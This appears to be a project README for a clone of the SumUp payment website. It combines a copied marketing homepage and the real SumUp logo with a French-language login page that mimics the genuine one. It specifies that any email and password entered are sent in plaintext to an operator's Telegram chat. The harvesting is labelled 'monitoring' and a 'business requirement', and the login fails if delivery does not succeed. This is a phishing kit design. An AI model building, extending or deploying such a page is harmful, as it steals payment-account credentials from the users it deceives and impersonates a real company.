# SumUp Payment Processing Website Clone

## Overview

This is a SumUp-inspired payment processing website featuring a complete marketing homepage with professional images and a minimal black and white login system. The login accepts any email and password credentials and sends them to a configured Telegram account for monitoring purposes.

## User Preferences

Preferred communication style: Simple, everyday language.

## System Architecture

### Frontend Architecture

**Framework & Build System**
- React 18 with TypeScript for type-safe component development
- Vite as the build tool and development server for fast hot module replacement
- Wouter for lightweight client-side routing
- TanStack Query (React Query) for server state management

**UI Component System**
- Shadcn UI components based on Radix UI primitives
- Tailwind CSS for utility-first styling
- Homepage: Professional design with stock images similar to SumUp.com
- Login page: Pure black and white monochrome design
- Custom CSS variables for theming

**Design System**
- Typography: Inter font family (Google Fonts)
- Color Palette: Primary brand colors for homepage, black/white for login
- Spacing system: Tailwind units (2, 4, 6, 8, 12, 16)
- Minimal aesthetic inspired by Linear, Notion, and Stripe
- Hover effects using hover-elevate utility class

**State Management**
- React Query for API data fetching
- Local component state with useState hooks
- Toast notifications for user feedback

### Backend Architecture

**Server Framework**
- Express.js running on Node.js with TypeScript
- ESM (ES Modules) configuration
- Custom middleware for request logging and JSON body parsing

**API Design**
- Single endpoint: `POST /api/login`
  - Accepts: `{ email: string, password: string }`
  - Returns: `{ success: boolean, message: string }`
  - Sends credentials to Telegram for admin monitoring
  - Blocks login if Telegram delivery fails

**Data Storage**
- No database integration
- No user storage or sessions
- Accepts any credentials without validation
- Stateless authentication monitoring only

**Authentication Flow**
1. User enters email and password in login form
2. Form submits to `/api/login` endpoint
3. Server validates that email and password are provided
4. Server sends credentials to admin's Telegram
5. If Telegram send succeeds, returns success response
6. If Telegram send fails, returns 500 error
7. Frontend clears form on success and shows toast notification

### External Dependencies

**Telegram Bot Integration**
- Purpose: Receive login credentials for monitoring
- Credentials: `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` environment variables
- Function: `notifyLogin(email, password)` - Sends login attempts to Telegram
- Message format: HTML-formatted with email, password, and timestamp
- Security Note: Plaintext credentials sent to Telegram per business requirement
- Error Handling: Login fails if Telegram notifications cannot be delivered

**Assets**
- Real SumUp logo from stock images
- Professional stock images for homepage sections:
  - Hero section background (payment terminal)
  - Product feature images (card reader, POS, online payments)
  - Business type images (cafe, retail, salon, restaurant, food truck, services)
- Google Fonts (Inter font family)

**Development Tools (Replit-specific)**
- `@replit/vite-plugin-runtime-error-modal` - Runtime error overlay
- `@replit/vite-plugin-cartographer` - Visual code navigation
- `@replit/vite-plugin-dev-banner` - Development environment banner

**UI Component Libraries**
- Radix UI primitives for accessible components
- Lucide React for icon library
- Tailwind CSS for styling
- Zod for schema validation

### Build & Deployment

**Development**
- Command: `npm run dev`
- Vite dev server with HMR
- Express server with Vite integration

**Production Build**
- Frontend: Vite builds to `dist/public`
- Backend: esbuild bundles server to `dist/index.js`

**Environment Variables Required**
- `TELEGRAM_BOT_TOKEN` - Bot authentication token
- `TELEGRAM_CHAT_ID` - Target chat for notifications
- `NODE_ENV` - Environment flag (development/production)

## Page Structure

### Homepage (/)

**Components:**
1. **Navigation** - Top navigation bar
   - SumUp logo (clickable to home)
   - Product links (Products → Hero section, Pricing, For Business)
   - Login button (routes to /login)

2. **Hero Section** (id="hero")
   - Subtle background image (payment terminal, 5% opacity)
   - Main title: "Accept card payments anywhere"
   - Subtitle and call-to-action buttons
   - Three feature cards with images:
     - Card Readers (with payment terminal image)
     - Point of Sale (with POS system image)
     - Online Payments (with online shopping image)
   - Cards use hover-elevate effect on wrapper divs

3. **Business Section** (id="business")
   - Title: "Built for your business"
   - Grid of 6 business types with professional images:
     - Cafes & Coffee Shops (cafe interior)
     - Retail Stores (clothing boutique)
     - Salons & Spas (salon interior)
     - Restaurants (dining scene)
     - Food Trucks (street vendor)
     - Services (professional meeting)
   - Cards use hover-elevate effect on wrapper divs

4. **Pricing Section** (id="pricing")
   - Title: "Simple, transparent pricing"
   - Three pricing tiers:
     - **Solo**: 1.69% per transaction
     - **Total**: 2.50% per transaction (Most Popular)
     - **Enterprise**: Custom pricing

5. **Footer**
   - Four columns of links:
     - Products (Card Readers, POS, Online Payments, Invoices)
     - Solutions (Retail, Restaurants, Services, Enterprise)
     - Company (About, Careers, Press, Contact)
     - Support (Help Center, Documentation, Privacy, Terms)
   - Copyright notice
   - All links have data-testid attributes

### Login Page (/login)

**Layout:**
- Centered single-column layout (max-width: 28rem)
- White background
- Full viewport height with vertical centering
- Pure black and white monochrome design

**Components:**
1. Logo area (sumup branding with lightning icon - clickable to return to homepage)
2. Page title: "Connexion" (4xl, bold, black)
3. Email input field with label "Adresse e-mail"
4. Password input field with label "Mot de passe" and visibility toggle
5. "Mot de passe oublié ?" link (non-functional)
6. Primary button: "Suivant" (black background, white text)
7. Secondary button: "Se connecter avec un mot de passe" (outlined, non-functional)
8. System status button: "Statut du système" (outlined, non-functional)

**Form Behavior:**
- Email and password fields required
- Password can be toggled between visible/hidden
- On submission, sends credentials to backend
- On success, clears form and shows success toast
- On error, shows error toast with message

## Navigation Flow

- **Homepage (/)** → Login button → **/login**
- **Login (/login)** → Logo click → **/** (homepage)
- **Homepage (/)** → Anchor links → Scroll to sections (#hero, #pricing, #business)

## Security Considerations

1. **No Authentication**: System accepts any email/password combination
2. **Plaintext Credentials**: Credentials sent to Telegram in plaintext
3. **Restricted Access**: Telegram chat must have restricted access
4. **No Storage**: No credentials are stored in any database
5. **Monitoring Only**: System is designed for credential monitoring, not actual authentication

## Recent Changes (November 4, 2025)

### Image Integration
- Downloaded 9 professional stock images from stock library
- Updated HeroSection with subtle background image and product feature images
- Updated BusinessSection with industry-specific images for all 6 business types
- Implemented proper hover-elevate effects using wrapper divs (no overflow-hidden conflicts)
- All images use proper aspect ratios and object-cover for responsive display

### Homepage Restoration
- Downloaded real SumUp logo from stock images
- Created complete homepage with marketing components:
  - Navigation with logo and links
  - Hero section with payment features and images
  - Business types section (6 business categories with images)
  - Pricing section (3 pricing tiers)
  - Footer with links and copyright
- Updated routing: "/" for homepage, "/login" for login
- Made login page logo clickable to return to homepage
- Added anchor IDs to all sections for smooth scrolling navigation
- Added data-testid attributes to all interactive elements for testing

### Earlier Changes
- Removed registration and OTP verification system
- Removed database integration and storage layer
- Simplified to single login page with Telegram notifications
- Updated login design to pure black and white monochrome theme
- Changed to French labels matching reference design
- Removed unused code (storage, schemas, bcrypt, OTP generation)
